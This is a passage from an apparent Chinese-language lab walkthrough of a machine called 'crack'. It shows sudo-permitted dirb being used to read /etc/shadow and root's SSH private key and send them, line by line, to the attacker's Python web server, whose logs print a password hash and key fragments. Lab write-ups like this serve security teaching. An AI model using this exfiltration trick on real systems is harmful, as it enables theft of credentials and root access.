class="string">&quot;GET /games:*:19515:0:99999:7::: HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">16</span>] code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">16</span>] <span class="string">&quot;GET /man:*:19515:0:99999:7::: HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">16</span>] code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">16</span>] <span class="string">&quot;GET /lp:*:19515:0:99999:7::: HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">16</span>] code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">16</span>] <span class="string">&quot;GET /mail:*:19515:0:99999:7::: HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">16</span>] code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">16</span>] <span class="string">&quot;GET /news:*:19515:0:99999:7::: HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">16</span>] code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">16</span>] <span class="string">&quot;GET /uucp:*:19515:0:99999:7::: HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">16</span>] code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">16</span>] <span class="string">&quot;GET /proxy:*:19515:0:99999:7::: HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">16</span>] code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">16</span>] <span class="string">&quot;GET /www-data:*:19515:0:99999:7::: HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">16</span>] code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">16</span>] <span class="string">&quot;GET /backup:*:19515:0:99999:7::: HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">16</span>] code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">16</span>] <span class="string">&quot;GET /list:*:19515:0:99999:7::: HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">16</span>] code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">16</span>] <span class="string">&quot;GET /irc:*:19515:0:99999:7::: HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">16</span>] code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">16</span>] <span class="string">&quot;GET /gnats:*:19515:0:99999:7::: HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">16</span>] code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">16</span>] <span class="string">&quot;GET /nobody:*:19515:0:99999:7::: HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">16</span>] code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">16</span>] <span class="string">&quot;GET /_apt:*:19515:0:99999:7::: HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">16</span>] code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">16</span>] <span class="string">&quot;GET /systemd-network:*:19515:0:99999:7::: HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">16</span>] code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">16</span>] <span class="string">&quot;GET /systemd-resolve:*:19515:0:99999:7::: HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">16</span>] code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">16</span>] <span class="string">&quot;GET /messagebus:*:19515:0:99999:7::: HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">16</span>] code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">16</span>] <span class="string">&quot;GET /systemd-timesync:*:19515:0:99999:7::: HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">16</span>] code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">16</span>] <span class="string">&quot;GET /sshd:*:19515:0:99999:7::: HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">16</span>] code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">16</span>] <span class="string">&quot;GET /cris:<span class="variable">$y</span><span class="variable">$j9T</span><span class="variable">$kFXVxpRhH2ZAeDGNazqRq</span>/<span class="variable">$IokBR4XhhyRJOur8YOHu3fF59</span>/0NOHC5AIsvkxXx8..:19515:0:99999:7::: HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">16</span>] code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">16</span>] <span class="string">&quot;GET /systemd-coredump:!*:19515:::::: HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">16</span>] code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">16</span>] <span class="string">&quot;GET /shellinabox:*:19515:0:99999:7::: HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">16</span>] code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">16</span>] <span class="string">&quot;GET /ftp:*:19515:0:99999:7::: HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br></pre></td></tr></table></figure>

<p>通过这种方式，我们可以试试得到id_rsa</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cris@crack:~<span class="variable">$</span> sudo <span class="literal">-u</span> root /usr/bin/dirb http://<span class="number">192.168</span>.<span class="number">56.127</span>/ /root/.ssh/id_rsa </span><br><span class="line"><span class="literal">-----------------</span>                                                                 </span><br><span class="line">DIRB v2.<span class="number">2</span>                                                                          </span><br><span class="line">By The Dark Raver</span><br><span class="line"><span class="literal">-----------------</span></span><br><span class="line">START_TIME: Thu Jul <span class="number">27</span> <span class="number">06</span>:<span class="number">13</span>:<span class="number">33</span> <span class="number">2023</span>                                                  </span><br><span class="line">URL_BASE: http://<span class="number">192.168</span>.<span class="number">56.127</span>/                                             </span><br><span class="line">WORDLIST_FILES: /root/.ssh/id_rsa                                                                                </span><br><span class="line"><span class="literal">-----------------</span></span><br><span class="line">GENERATED WORDS: <span class="number">38</span>                                                                             </span><br><span class="line"><span class="literal">----</span> Scanning URL: http://<span class="number">192.168</span>.<span class="number">56.127</span>/ <span class="literal">----</span>                                                                                           </span><br><span class="line"><span class="literal">-----------------</span></span><br><span class="line">END_TIME: Thu Jul <span class="number">27</span> <span class="number">06</span>:<span class="number">13</span>:<span class="number">34</span> <span class="number">2023</span> </span><br><span class="line">DOWNLOADED: <span class="number">38</span> - FOUND: <span class="number">0</span>                                                            </span><br><span class="line">cris@crack:~<span class="variable">$</span>   </span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># python -m http.server 80</span></span><br><span class="line">Serving HTTP on <span class="number">0.0</span>.<span class="number">0.0</span> port <span class="number">80</span> (http://<span class="number">0.0</span>.<span class="number">0.0</span>:<span class="number">80</span>/) ...</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] <span class="string">&quot;GET /randomfile1 HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] <span class="string">&quot;GET /frand2 HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] <span class="string">&quot;GET /-----BEGIN HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] <span class="string">&quot;GET /b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] <span class="string">&quot;GET /NhAAAAAwEAAQAAAYEAxBvRe3EH67y9jIt2rwa79tvPDwmb2WmYv8czPn4bgSCpFmhDyHwn HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] <span class="string">&quot;GET /b0IUyyw3iPQ3LlTYyz7qEc2vaj1xqlDgtafvvtJ2EJAJCFy5osyaqbYKgAkGkQMzOevdGt HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] <span class="string">&quot;GET /xNQ8NxRO4/bC1v90lUrhyLi/ML5B4nak+5vLFJi8NlwXMQJ/xCWZg5+WOLduFp4VvHlwAf HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] <span class="string">&quot;GET /tDh2C+tJp2hqusW1jZRqSXspCfKLPt/v7utpDTKtofxFvSS55MFciju4dIaZLZUmiqoD4k HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] <span class="string">&quot;GET //+FwJbMna8iPwmvK6n/2bOsE1+nyKbkbvDG5pjQ3VBtK23BVnlxU4frFrbicU+VtkClfMu HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] <span class="string">&quot;GET /yp7muWGA1ydvYUruoOiaURYupzuxw25Rao0Sb8nW1qDBYH3BETPCypezQXE22ZYAj0ThSl HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] <span class="string">&quot;GET /Kn2aZN/8xWAB+/t96TcXogtSbQw/eyp9ecmXUpq5i1kBbFyJhAJs7x37WM3/Cb34a/6v8c HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] <span class="string">&quot;GET /9rMjGl9HMZFDwswzAGrvPOeroVB/TpZ+UBNGE1znAAAFgC5UADIuVAAyAAAAB3NzaC1yc2 HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] <span class="string">&quot;GET /EAAAGBAMQb0XtxB+u8vYyLdq8Gu/bbzw8Jm9lpmL/HMz5+G4EgqRZoQ8h8J29CFMssN4j0 HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] <span class="string">&quot;GET /Ny5U2Ms+6hHNr2o9capQ4LWn777SdhCQCQhcuaLMmqm2CoAJBpEDMznr3RrcTUPDcUTuP2 HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] <span class="string">&quot;GET /wtb/dJVK4ci4vzC+QeJ2pPubyxSYvDZcFzECf8QlmYOflji3bhaeFbx5cAH7Q4dgvrSado HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] <span class="string">&quot;GET /arrFtY2Uakl7KQnyiz7f7+7raQ0yraH8Rb0kueTBXIo7uHSGmS2VJoqqA+JP/hcCWzJ2vI HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] <span class="string">&quot;GET /j8Jryup/9mzrBNfp8im5G7wxuaY0N1QbSttwVZ5cVOH6xa24nFPlbZApXzLsqe5rlhgNcn HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] <span class="string">&quot;GET /b2FK7qDomlEWLqc7scNuUWqNEm/J1tagwWB9wREzwsqXs0FxNtmWAI9E4UpSp9mmTf/MVg HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] <span class="string">&quot;GET /Afv7fek3F6ILUm0MP3sqfXnJl1KauYtZAWxciYQCbO8d+1jN/wm9+Gv+r/HPazIxpfRzGR HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] <span class="string">&quot;GET /Q8LMMwBq7zznq6FQf06WflATRhNc5wAAAAMBAAEAAAGAeX9uopbdvGx71wZUqo12iLOYLg HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168</span>.<span 